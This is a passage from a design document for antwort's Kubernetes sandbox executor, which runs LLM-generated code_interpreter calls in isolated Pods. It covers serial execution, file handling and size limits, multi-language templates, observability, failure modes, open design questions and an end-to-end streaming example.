3. The sandbox executor's `CanExecute("code_interpreter")` returns true
4. The executor runs the code and returns a `ToolResult`
5. The loop converts the result back to a `code_interpreter_call` output item and feeds it to the next provider turn

### Concurrent Execution Within a Session

Multiple `code_interpreter_call` items in the same turn (if the LLM generates them) execute **serially** in the same sandbox Pod, not in parallel. Rationale:

- They share the same Python environment (filesystem, installed packages)
- Parallel execution of code that writes to the same files causes race conditions
- The Pod has limited CPU/memory, parallel execution would compete for resources
- Serial execution preserves deterministic ordering of side effects

The existing `executeToolsConcurrently()` in `loop.go` runs all tool calls in parallel. For sandbox tools, the executor serializes internally:

```go
func (e *SandboxExecutor) Execute(ctx context.Context, call tools.ToolCall) (*tools.ToolResult, error) {
    session, _ := e.sessions.GetOrCreate(ctx, ...)

    // Serialize execution within a session.
    // Multiple goroutines may call Execute concurrently for the same session,
    // but only one executes at a time on the sandbox Pod.
    session.mu.Lock()
    defer session.mu.Unlock()

    return e.executeInSandbox(ctx, session, code)
}
```

### Error Handling and LLM Feedback

When code execution fails, the error is returned as a `ToolResult` with `IsError: true`. The LLM receives the error message as part of the conversation and can:

- Fix syntax errors and retry
- Install missing packages and retry
- Reduce memory usage if OOM killed
- Simplify the approach if the timeout was hit

Example error fed back to the LLM:

```
Execution failed (exit code 1):
stderr:
  Traceback (most recent call last):
    File "/tmp/exec_k9m2.py", line 3, in <module>
      import seaborn as sns
  ModuleNotFoundError: No module named 'seaborn'

Note: You can install packages by including them in your code:
  import subprocess
  subprocess.run(["uv", "pip", "install", "seaborn"])
```

---

## 9. File Handling

### File Generation and Detection

The execution server detects generated files by comparing the workspace directory before and after execution:

```go
// In the execution server
preFiles := scanDir("/workspace")
runPython(code)
postFiles := scanDir("/workspace")
newFiles := diff(preFiles, postFiles)  // New or modified files
```

Each new file gets a unique ID (`f_` prefix + 12 random alphanumeric characters) and is registered in the execution server's file index.

### File Access API

Clients access generated files through antwort's file proxy endpoint:

```
GET /v1/files/{file_id}/content
```

Antwort receives this request, resolves the file's sandbox session, and proxies the request to the sandbox Pod's `GET /files/{id}` endpoint via mTLS. The client never communicates directly with the sandbox Pod.

### File Lifecycle

Files live as long as the sandbox Pod lives (session-scoped):

```
Session created -> Pod allocated
  └── Turn 1: generates plot.png (f_abc123)
  └── Turn 2: generates data.csv (f_def456)
  └── Turn 3: reads plot.png, generates report.pdf (f_ghi789)
  └── ... (all files accessible)
Session ends -> Pod released -> files destroyed
```

After session termination, file access returns 404.

### File Size Limits

| Limit | Default | Configurable |
|-------|---------|-------------|
| Single file max | 10 MB | 1 MB to 100 MB |
| Total workspace max | 100 MB | 10 MB to 1 GB |
| Max files per execution | 50 | 1 to 500 |

The execution server enforces these limits. If a code execution would exceed the workspace limit, the execution completes but the over-limit files are not indexed (they exist on disk but are not returned in the response).

### Future: Persistent File Storage

For files that need to outlive the session (exported reports, generated datasets), a future enhancement can:

1. Copy files from the sandbox Pod to object storage (S3, GCS, MinIO) before session termination
2. Return permanent URLs in the `code_interpreter_call` output
3. Apply retention policies (auto-delete after 7 days, etc.)

This is out of scope for the initial implementation.

---

## 10. Language Support Strategy

### Python First

The initial release ships with Python 3.12 as the sole supported language. Python is the dominant language for:

- Data analysis (pandas, numpy, scipy)
- Visualization (matplotlib, plotly, seaborn)
- Machine learning (scikit-learn, pytorch, tensorflow)
- General-purpose scripting

### BYO Image: Any Language

The REST API contract (`/execute`, `/files`, `/health`, `/install`) is language-agnostic. Any container image that implements these endpoints works as a sandbox.

Example `SandboxTemplate` for Node.js:

```yaml
apiVersion: agents.x-k8s.io/v1alpha1
kind: SandboxTemplate
metadata:
  name: antwort-nodejs
spec:
  podTemplate:
    metadata:
      labels:
        sandbox.antwort.dev/language: nodejs
    spec:
      runtimeClassName: gvisor
      containers:
      - name: sandbox
        image: ghcr.io/rhuss/antwort-sandbox-nodejs:22
        ports:
        - name: api
          containerPort: 8080
```

The Node.js execution server would:
- Accept code via `POST /execute`
- Write to a `.js` file and run via `node`
- Handle packages via `npm install` on `POST /install`
- Return the same structured JSON response

### Language Detection and Routing

When multiple `SandboxTemplate` resources are registered, antwort can route `code_interpreter_call` items to the appropriate template based on:

1. **Explicit hint**: The LLM or client specifies the language via a `language` field in the `code_interpreter` tool configuration
2. **Code analysis**: Simple heuristics (presence of `import`, `def`, `class` suggests Python; `const`, `let`, `require` suggests JavaScript)
3. **Default**: If no hint and no detection, use the default template (Python)

For the initial implementation, only approach 1 (explicit) and 3 (default) are needed. Heuristic detection is a future enhancement.

### Multiple Templates Active Simultaneously

Each language gets its own `SandboxWarmPool` with independent sizing:

```yaml
# Python pool: higher demand, more pre-warmed Pods
apiVersion: agents.x-k8s.io/v1alpha1
kind: SandboxWarmPool
metadata:
  name: pool-python
spec:
  templateRef:
    name: antwort-python
  replicas: 5
---
# Node.js pool: lower demand, fewer pre-warmed Pods
apiVersion: agents.x-k8s.io/v1alpha1
kind: SandboxWarmPool
metadata:
  name: pool-nodejs
spec:
  templateRef:
    name: antwort-nodejs
  replicas: 2
```

---

## 11. Observability

### Prometheus Metrics

All metrics use the `antwort_` prefix for consistency with existing antwort metrics.

```go
// Counters
antwort_sandbox_executions_total{tenant, language, status}
// status: "success", "error", "timeout", "oom"

antwort_sandbox_claims_total{template, result}
// result: "bound", "timeout", "error"

antwort_sandbox_sessions_created_total{tenant}
antwort_sandbox_sessions_ended_total{tenant, reason}
// reason: "completed", "idle_timeout", "pod_failure", "explicit"

antwort_sandbox_package_installs_total{language, status}
// status: "success", "error"

// Histograms
antwort_sandbox_execution_duration_seconds{language}
// Buckets: 0.1, 0.5, 1, 2, 5, 10, 30, 60, 120, 300

antwort_sandbox_claim_bind_duration_seconds{template}
// Buckets: 0.05, 0.1, 0.25, 0.5, 1, 2, 5, 10, 30

antwort_sandbox_file_size_bytes{language}
// Buckets: 1KB, 10KB, 100KB, 1MB, 10MB, 100MB

// Gauges
antwort_sandbox_active_sessions{tenant}
antwort_sandbox_warm_pool_available{template}
antwort_sandbox_warm_pool_total{template}
```

### Structured Logging

Every sandbox operation emits structured log entries via `slog`. Key log events:

```
INFO  sandbox session created    conversation_id=resp_abc123 tenant_id=t42 template=antwort-python claim=claim-resp-abc123
INFO  sandbox execution started  conversation_id=resp_abc123 code_hash=sha256:a1b2c3 code_length=245
INFO  sandbox execution completed conversation_id=resp_abc123 exit_code=0 duration_ms=1523 files_generated=2
WARN  sandbox execution timeout  conversation_id=resp_abc123 timeout_seconds=30 partial_stdout_length=128
ERROR sandbox pod unreachable    conversation_id=resp_abc123 pod_ip=10.244.3.17 error="connection refused"
INFO  sandbox session ended      conversation_id=resp_abc123 reason=idle_timeout duration_minutes=10.2
```

### OpenTelemetry Trace Propagation

Traces flow from the client request through the antwort engine, across the mTLS boundary to the sandbox Pod, and through the Python execution:

```
[Client Request]
  └── [antwort: CreateResponse]
       └── [antwort: runAgenticLoop turn=2]
            └── [antwort: SandboxExecutor.Execute]
                 ├── [antwort: SessionManager.GetOrCreate]
                 │    └── [antwort: createSandboxClaim]
                 │         └── [k8s API: create SandboxClaim]
                 └── [antwort: executeInSandbox]
                      └── [sandbox-pod: POST /execute]
                           ├── [sandbox: write script]
                           ├── [sandbox: run python3]
                           └── [sandbox: scan files]
```

Trace context propagation uses the W3C `traceparent` header, passed from antwort to the sandbox Pod in the HTTP request. The sandbox execution server (if instrumented with OpenTelemetry) creates child spans for script writing, execution, and file scanning.

---

## 12. Failure Modes

### Warm Pool Exhausted

**Symptom**: `SandboxClaim` remains in `Pending` state beyond the claim timeout.

**Handling**:
1. Antwort waits for the claim to bind (configurable timeout, default 30s)
2. If the warm pool controller creates a new Pod, binding happens when the Pod is ready (3-10s cold start)
3. If `maxReplicas` is reached and no Pods are available, the claim stays pending
4. After the timeout, antwort returns an error result to the LLM:

```json
{
  "output": "Code execution unavailable: sandbox allocation timed out after 30s. The system is under heavy load. Please try again later.",
  "is_error": true
}
```

5. Emit metric: `antwort_sandbox_claims_total{result="timeout"}`
6. Log at WARN level with queue depth information

**Client experience**: If streaming, emit a `code_interpreter_call.completed` event with error status. The LLM may respond with a text explanation ("I'm unable to run code right now due to high demand").

### Pod OOM Killed

**Symptom**: Subprocess exits with code 137 (SIGKILL from OOM killer).

**Handling**:
1. Execution server detects exit code 137
2. Returns structured error with memory limit information
3. Error fed to LLM so it can adjust (process data in chunks, use generators instead of lists)

```
Execution killed: out of memory.
Memory limit: 512Mi. Your code likely exceeded this limit.
Suggestions:
- Process data in smaller batches
- Use generators instead of loading everything into memory
- Reduce the size of intermediate data structures
```

### Execution Timeout

**Symptom**: Subprocess does not complete within the timeout.

**Handling**:
1. Execution server sends SIGKILL to the process group after timeout
2. Partial stdout (if any was captured before the kill) is returned
3. Error result includes the timeout duration

```json
{
  "status": "timeout",
  "stdout": "Processing item 1...\nProcessing item 2...\n",
  "stderr": "",
  "exit_code": -1,
  "duration_ms": 30000
}
```

The LLM sees this and can optimize its code (use vectorized operations, reduce iterations, add early termination).

### Pod Crash (Non-OOM)

**Symptom**: The sandbox Pod's container crashes (segfault in native library, corrupted state, runtime panic).

**Handling**:
1. Antwort detects the Pod is not ready (connection refused, or health check fails)
2. The `SandboxClaim` status is updated by the agent-sandbox controller
3. Antwort creates a new `SandboxClaim` for the conversation
4. The error result informs the LLM that state was lost:

```
Sandbox environment crashed. A new environment has been allocated.
All previously installed packages and created files have been lost.
Please re-install any required packages and re-create any needed files.
```

5. The session manager updates the mapping to the new Pod

### Network Partition

**Symptom**: mTLS connection to the sandbox Pod times out or is refused.

**Handling**:
1. Connection timeout (10s)
2. Retry up to 3 times with exponential backoff (100ms, 200ms, 400ms)
3. If all retries fail, check Pod health via Kubernetes API (is the Pod still Running?)
4. If Pod is Running but unreachable, it may be a network issue. Return transient error.
5. If Pod is not Running, treat as Pod crash (see above).

### Cluster-Level Issues

**Symptom**: Kubernetes API is unavailable (can't create `SandboxClaim`), SPIRE server is down (can't get SVIDs), etc.

**Handling**:
1. Health check endpoint (`/healthz` on antwort) includes sandbox subsystem status
2. If the Kubernetes API is unreachable, sandbox health reports degraded
3. Circuit breaker pattern: after N consecutive failures, stop attempting sandbox operations for a cooldown period
4. Requests with `code_interpreter` tool during circuit-open state receive an immediate error (no waiting for timeout)

```go
type CircuitBreaker struct {
    failureThreshold int           // Default: 5
    cooldownDuration time.Duration // Default: 30 seconds
    failures         int
    lastFailure      time.Time
    state            string        // "closed", "open", "half-open"
}
```

---

## 13. Open Questions

### Q1: Interactive/REPL Mode vs. Script Execution

**Script execution** (current design): Each `code_interpreter_call` writes the code to a file and runs `python3 <file>`. Variables do not persist between calls. State is shared only through files on disk.

**REPL/kernel mode**: A persistent Python process (like a Jupyter kernel) stays alive across calls. Variables, imports, and function definitions persist in memory. This is what OpenAI's code interpreter does.

Arguments for REPL mode:
- More natural: `df = pd.read_csv('data.csv')` in call 1, then `df.describe()` in call 2
- Faster: no Python startup cost on each call
- Closer to OpenAI's behavior

Arguments for script mode:
- Simpler: no persistent process management, no state corruption risks
- More predictable: each execution is independent
- Easier to reason about security: no residual state from previous malicious code

**Recommendation**: Start with script mode. Add REPL mode as an opt-in feature later. The execution server can support both: `POST /execute` for script mode, `POST /kernel/execute` for REPL mode. The session model already supports state persistence via the Pod lifecycle.

### Q2: Long-Running Computations

What happens when a legitimate computation needs more than the 300-second maximum timeout? Examples: training a model on a large dataset, processing a multi-GB file.

Options:
- **Streaming partial output**: The execution server streams stdout to antwort as it's produced, not just at the end. The client sees incremental progress. This requires changing `/execute` from request-response to server-sent events or chunked transfer encoding.
- **Background execution**: The execution server returns immediately with a job ID. Antwort polls for completion. This adds complexity but supports arbitrarily long computations.
- **Accept the limit**: 300 seconds is the hard ceiling. Computations that need more should use a different tool (batch processing system, not interactive code interpreter).

**Recommendation**: Accept the limit for the initial release. 300 seconds covers the vast majority of interactive data analysis tasks. Add streaming partial output as a v2 feature.

### Q3: User File Uploads into Sandbox

Should the client be able to upload files (CSV, images, datasets) into the sandbox for the code to process?

The Responses API does not have a standard file upload mechanism for `code_interpreter`. OpenAI's implementation ties into their Files API (`/v1/files`). Antwort would need:

1. A `/v1/files` endpoint for uploading files
2. A mechanism to inject uploaded files into the sandbox Pod's `/workspace`
3. File lifecycle management (cleanup after session ends)

**Recommendation**: Defer to a future spec. The initial implementation supports code that generates files, but not code that consumes uploaded files. This is a significant feature that warrants its own design.

### Q4: Sandbox Code Calling MCP Tools

Can Python code running in the sandbox invoke MCP tools? For example, a sandbox script that calls an MCP-connected database tool to fetch data, processes it with pandas, and returns a plot.

This would require:
1. The sandbox Pod to have an MCP client
2. The sandbox Pod to have network access to MCP servers
3. Authentication propagation from antwort through the sandbox to the MCP server

**Recommendation**: No, at least not in the initial implementation. The sandbox is an isolated execution environment. If the LLM needs both MCP data and code execution, it should use the MCP tool first (in one agentic turn), then pass the data to `code_interpreter` (in the next turn). The agentic loop already supports this multi-step pattern.

### Q5: Cost Allocation and Quotas

How should sandbox resource consumption be attributed to tenants for chargeback or quota enforcement?

- CPU and memory usage are tracked per Pod (Kubernetes resource metrics)
- Execution count and duration are tracked via Prometheus metrics (labeled by tenant)
- Warm pool Pods consume resources even when idle

Options:
- **Per-execution billing**: Track CPU-seconds and memory-seconds per execution, bill per tenant
- **Per-session billing**: Track session duration, bill for Pod uptime
- **Quota limits**: Hard cap on concurrent sessions, executions per hour, or total compute-seconds per day

**Recommendation**: Implement the metrics and labels in the initial release. Quota enforcement and billing integration are future features.

---

## Appendix A: Package Layout

```
pkg/tools/sandbox/
    executor.go         // SandboxExecutor (implements ToolExecutor)
    session.go          // SessionManager (conversation -> Pod mapping)
    client.go           // HTTP client for sandbox REST API (mTLS)
    types.go            // ExecuteRequest, ExecuteResult, FileInfo, etc.
    config.go           // SandboxConfig, timeouts, template references
    k8s.go              // Kubernetes API operations (create/watch SandboxClaim)
    circuit_breaker.go  // Circuit breaker for cluster-level failures
    doc.go              // Package documentation

cmd/sandbox-server/
    main.go             // Execution server entry point
    server.go           // HTTP server (health, execute, files, install)
    executor.go         // Python subprocess execution logic
    files.go            // File scanning and management
    config.go           // Server configuration
```

## Appendix B: Configuration Example

```yaml
# antwort configuration (antwort.yaml)
sandbox:
  enabled: true
  namespace: antwort-sandboxes
  default_template: antwort-python
  templates:
    python: antwort-python
    nodejs: antwort-nodejs
  claim_timeout: 30s
  execution_timeout: 30s
  max_execution_timeout: 300s
  idle_session_timeout: 10m
  session_mode: session  # "session" or "ephemeral"
  spiffe:
    trust_domain: cluster.local
    socket_path: /run/spire/sockets/agent.sock
  file_limits:
    max_file_size: 10Mi
    max_workspace_size: 100Mi
    max_files_per_execution: 50
  circuit_breaker:
    failure_threshold: 5
    cooldown_duration: 30s
```

## Appendix C: End-to-End Example

A complete request-response cycle for a data analysis task:

**Client request:**
```json
POST /v1/responses
{
  "model": "qwen-2.5-coder-32b",
  "input": [
    {
      "type": "message",
      "role": "user",
      "content": [{"type": "input_text", "text": "Generate 1000 random data points from a normal distribution and plot a histogram with a fitted curve."}]
    }
  ],
  "tools": [{"type": "code_interpreter"}],
  "stream": true
}
```

**SSE event stream:**
```
event: response.created
data: {"type":"response.created","sequence_number":0,"response":{"id":"resp_k9m2n4p6q8r0","status":"in_progress",...}}

event: response.in_progress
data: {"type":"response.in_progress","sequence_number":1,...}

event: response.output_item.added
data: {"type":"response.output_item.added","sequence_number":2,"output_index":0,"item":{"id":"item_a1b2c3","type":"code_interpreter_call","status":"in_progress","code":"import numpy as np\nimport matplotlib.pyplot as plt\nfrom scipy import stats\n\nnp.random.seed(42)\ndata = np.random.normal(loc=0, scale=1, size=1000)\n\nfig, ax = plt.subplots(figsize=(10, 6))\ncount, bins, _ = ax.hist(data, bins=30, density=True, alpha=0.7, color='steelblue', edgecolor='white')\n\nx = np.linspace(bins[0], bins[-1], 100)\nmu, std = stats.norm.fit(data)\npdf = stats.norm.pdf(x, mu, std)\nax.plot(x, pdf, 'r-', linewidth=2, label=f'Fitted Normal\\n\u03bc={mu:.2f}, \u03c3={std:.2f}')\n\nax.set_xlabel('Value')\nax.set_ylabel('Density')\nax.set_title('Normal Distribution: 1000 Random Samples')\nax.legend()\nplt.tight_layout()\nplt.savefig('histogram.png', dpi=150)\nprint(f'Mean: {mu:.4f}')\nprint(f'Std:  {std:.4f}')"}}

event: response.code_interpreter_call.interpreting
data: {"type":"response.code_interpreter_call.interpreting","sequence_number":3,"item_id":"item_a1b2c3","output_index":0}

event: response.code_interpreter_call.completed
data: {"type":"response.code_interpreter_call.completed","sequence_number":4,"item_id":"item_a1b2c3","output_index":0,"item":{"id":"item_a1b2c3","type":"code_interpreter_call","status":"completed","code":"...","results":[{"type":"text","text":"Mean: -0.0117\nStd:  0.9920"},{"type":"image","file_id":"file_x7y8z9","url":"/v1/files/file_x7y8z9/content"}]}}

event: response.output_item.added
data: {"type":"response.output_item.added","sequence_number":5,"output_index":1,"item":{"id":"item_d4e5f6","type":"message","status":"in_progress","role":"assistant","content":[]}}

event: response.content_part.added
data: {"type":"response.content_part.added","sequence_number":6,"item_id":"item_d4e5f6","output_index":1,"content_index":0,"part":{"type":"output_text","text":""}}

event: response.output_text.delta
data: {"type":"response.output_text.delta","sequence_number":7,"item_id":"item_d4e5f6","output_index":1,"content_index":0,"delta":"I generated 1000 random data points from a standard normal distribution and created a histogram with a fitted normal curve overlay. "}

event: response.output_text.delta
data: {"type":"response.output_text.delta","sequence_number":8,"item_id":"item_d4e5f6","output_index":1,"content_index":0,"delta":"The fitted parameters are very close to the true distribution: mean = -0.0117 (true: 0) and standard deviation = 0.9920 (true: 1), confirming a good fit."}

event: response.output_text.done
data: {"type":"response.output_text.done","sequence_number":9,"item_id":"item_d4e5f6","output_index":1,"content_index":0,"text":"I generated 1000 random data points from a standard normal distribution and created a histogram with a fitted normal curve overlay. The fitted parameters are very close to the true distribution: mean = -0.0117 (true: 0) and standard deviation = 0.9920 (true: 1), confirming a good fit."}

event: response.content_part.done
data: {"type":"response.content_part.done","sequence_number":10,"item_id":"item_d4e5f6","output_index":1,"content_index":0,"part":{"type":"output_text","text":"I generated 1000 random data points..."}}

event: response.output_item.done
data: {"type":"response.output_item.done","sequence_number":11,"output_index":1,"item":{"id":"item_d4e5f6","type":"message","status":"completed","role":"assistant","content":[{"type":"output_text","text":"I generated 1000 random data points..."}]}}

event: response.completed
data: {"type":"response.completed","sequence_number":12,"response":{"id":"resp_k9m2n4p6q8r0","status":"completed","output":[...],...}}
```

**File download:**
```
GET /v1/files/file_x7y8z9/content
-> Content-Type: image/png
-> <binary PNG data: the histogram plot>
```

---

## Summary

The sandbox executor is the capability that turns antwort from an inference proxy into a computational agent platform. It combines:

- Kubernetes-native isolation (gVisor, NetworkPolicy, RBAC, SecurityContext)
- Sub-second Pod allocation (via agent-sandbox warm pools)
- Zero-trust communication (SPIFFE/SPIRE mTLS)
- Full Responses API compatibility (code_interpreter tool, SSE events, file references)
- Session-scoped state persistence (packages, files, environment)
- Deep observability (Prometheus metrics, structured logging, OpenTelemetry traces)

The initial implementation targets Python with script-mode execution. The architecture supports future extension to multiple languages, REPL mode, file uploads, and persistent workspaces.
